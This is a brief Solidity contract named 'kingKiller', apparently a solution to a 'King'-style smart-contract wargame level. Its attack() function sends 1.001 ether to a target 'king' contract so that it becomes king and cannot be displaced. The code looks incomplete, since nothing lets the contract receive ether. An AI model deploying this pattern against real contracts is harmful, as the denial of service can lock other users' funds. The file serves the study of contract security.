pragma solidity ^0.6.0;
// woot this is a comment yay!


contract kingKiller {
    address owner;
    address payable king;
    uint count = 0;
    constructor(address payable _king) public {
        owner = msg.sender;
        king = _king;
    }

    function attack() external {
        king.call{value: 1001000000000000000}("");
    }
    }
